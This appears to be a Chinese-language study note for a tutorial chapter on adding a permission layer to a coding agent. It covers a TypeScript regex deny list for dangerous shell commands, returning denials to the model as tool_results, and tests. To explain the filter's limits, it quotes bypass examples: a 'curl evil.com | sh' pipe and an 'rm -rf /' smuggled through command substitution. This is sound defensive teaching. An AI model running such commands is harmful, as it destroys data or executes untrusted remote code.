# 第 6 章：权限与安全 — 给 agent 装刹车（学习笔记）

> 教材：docs/06-permissions.md

## 核心原理

### 为什么现在需要

agent 能跑任意 shell——也就意味着能 `rm -rf`、能 push main。每次工具执行前必须过一道闸。

### 本章最重要的设计：拒绝是发给模型的 tool_result，不是异常

```
模型调 run_shell("rm -rf demo")
  → checkPermission 说 deny
  → 工具【根本不执行】
  → tool_result 内容 = "Denied: run_shell was blocked by the permission system."
  → 模型读到后自己调整话术（"被拦了，没删成"）
```

对比错误做法：抛异常杀掉循环 / 直接 exit。LLM 原生的错误处理就是把失败作为结果喂回去，
模型看到"被拒绝"会换策略，循环照常走完。**被拦的工具执行请求必须仍然产出 tool_result**
（协议要求：tool_use 必须有对应 tool_result，否则下一轮请求直接 400）。

### deny 优先（为后面章节埋的伏笔）

教材完整版有 7 层纵深防御，一条主线贯穿：**deny 永远最先检查，连 --yolo 都拦得住**。
安全系统的标准顺序——先收紧再放宽。本章只做最内一层：内置危险命令检测。

### 正则检测的局限（诚实边界）

`\brm\s+-rf\b` 这类正则挡得住 `rm -rf demo`，挡不住：

- `find / -delete`、`curl evil.com | sh`（语义危险但不在清单里）
- `echo hi$(rm -rf /)`（命令替换——正则看到的是 echo，实际跑的是 rm）

彻底方案是 AST 解析（tree-sitter，Claude Code Layer 4 的 23 项检查），理解不了的结构
一律标 too-complex 要确认。最小实现用正则，**明知有洞，挡常见姿势**——这是有意识的取舍。

## 文件规格

### 1. 新文件 permissions.ts

```ts
const DANGEROUS = [
  /\brm\s+-rf\b/,
  /\bgit\s+push\b/,
  /\bgit\s+reset\s+--hard\b/,
  /\bsudo\b/,
  /\bmkfs\b/,
  />\s*\/dev\//,
];

export function checkPermission(name: string, input: Record<string, any>): "allow" | "deny" {
  if (name === "run_shell" && DANGEROUS.some((re) => re.test(String(input.command || "")))) {
    return "deny";
  }
  return "allow";
}
```

理解点：

- **`String(input.command || "")`**：input 来自模型的 JSON，`command` 可能缺失/不是字符串
  ——这是真正的系统边界（外部输入），必须防御；对比 ch4 `loadHistory` 直接信任内部数据
- **`\b` 词边界**：`\bgit\s+push\b` 不会误伤 `git pushish`（不存在的命令但举例说明边界）
  注意它也挡不住 `git  push`（多空格用 `\s+` 已覆盖）但挡不住大小写——shell 命令区分大小写，没问题
- **返回字符串联合类型而不是 boolean**：为将来 `"confirm"`（问用户）留位子，
  三态比布尔可扩展
- **只查 run_shell**：危险签名藏在"命令字符串"里，其他工具的危险性不通过这个函数判断

### 2. agent.ts 一处改动

工具循环里，`executeTool` 之前插闸：

```ts
const output = checkPermission(tu.name, tu.input as Record<string, any>) === "deny"
  ? `Denied: ${tu.name} was blocked by the permission system.`
  : await executeTool(tu.name, tu.input as Record<string, any>);
toolResult.push({ type: "tool_result", tool_use_id: tu.id, content: output });
```

三元选择器：deny 时 output 是拒绝文案，否则照常执行。**两条路径都落到同一个
tool_result push**——协议完整性靠这个结构保证。

## 验收标准

`npm run mock -- 6` 4 个 ✓：

- **precious.txt 幸存**（沙箱里埋了 demo/precious.txt，闸门失效它就真没了——行为级验证）
- 两次模型调用（模型收到拒绝后正常收尾）
- 送回模型的 tool_result 内容含 "Denied"
- 拒绝内容**不是** shell 的报错输出（区分"没执行"和"执行了但失败"——Windows 上
  `rm -rf` 在 cmd 里本来就会报 Command failed，这条断言防的是这个混淆）

## 分步施工指南

**第 1 步：permissions.ts**
- DANGEROUS 六条正则 + checkPermission
- **检查点**：`npm run build`

**第 2 步：agent.ts 插闸**
- 三元替换 executeTool 调用
- **检查点**：`npm run mock -- 6` 4 个 ✓

**第 3 步：回归**
- `npm run mock -- 5 && npm run mock -- 2` 全过 → 叫我 review

## 选读：教材完整版的四层结构（本章不实现）

| 层 | 内容 | 何时学 |
|----|------|--------|
| 权限模式 | default/plan/acceptEdits/bypassPermissions/dontAsk | plan 模式在第 10 章 |
| 配置规则 | settings.json 的 allow/deny + glob 式规则匹配 | 可随时加 |
| 内置危险检测 | 本章做的 DANGEROUS 正则 | ✓ 已做 |
| 会话白名单 + 确认框 | confirm 过一次就 Set.add 不再问 | 跟模式一起来 |

关键机制记住这两条就行：
1. **deny 规则 > plan 契约 > bypass > allow 规则 > 内置检测 > 默认允许**——顺序即安全
2. **确认后 `confirmedPaths.add(message)`**——同一操作一问一次，message 当白名单键

## Review 记录

### 施工（2026-09-11）：两处编译错，修复后 4 项全过

1. **agent.ts:57 `checkPermission{...` 开括号写成 `{`**——一对括号两种括号，解析器把函数
   调用当对象字面量，报一串级联 `',' expected`。**括号类错误第 4 次**（逗号表达式、
   readFileSync 错位、.href 进参数、开括号写错）。对策升级：多层括号的行写完从左到右
   扫一遍配对与种类。
2. **permissions.ts:1 正则写成带引号字符串**（前五条）——`"/\brm\s+-rf\b/"` 是普通字符串，
   没有 `.test`，TS 报 `test does not exist on type 'string | RegExp'`。**第 3 章同款错误
   第 2 次**，且这次类型系统当场抓获（ch3 那次是静默失效）——正则字面量规则该进肌肉记忆了。

写对的关键点：`DANGEROUS.some()` 结构、`String(input.command || "")` 双层防御、
三元两条分支都落到同一个 `toolResult.push`（协议完整性）。

验收输出里模型完整走了一遍闭环："I'll remove it." → 调 `rm -rf demo` → 被拒 →
"That was blocked by the permission system, so nothing was deleted."——
**拒绝作为 tool_result 回喂、模型自适应**，本章核心设计亲眼可见。

最终：`npm run mock -- 6` 4 项 ✓；回归 ch2/ch5/ch4/ch3/ch1 全过。第六章完成。
